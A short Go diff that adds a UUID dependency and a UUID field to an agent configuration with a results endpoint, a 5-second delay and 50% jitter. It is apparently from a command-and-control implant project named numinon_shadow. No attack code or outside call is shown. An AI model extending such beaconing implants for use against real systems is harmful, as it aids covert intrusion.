@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/json"
+	"github.com/google/uuid"
 	"log"
 	"numinon_shadow/internal/agent/agent"
 	"numinon_shadow/internal/agent/config"
@@ -24,6 +25,7 @@ func main() {
 		ResultsEndpoint: "/results",
 		Delay:           time.Second * 5,
 		Jitter:          0.50,
+		UUID:            uuid.New().String(),
 	}
 
 	prettyPrintConfig(&agentConfig)
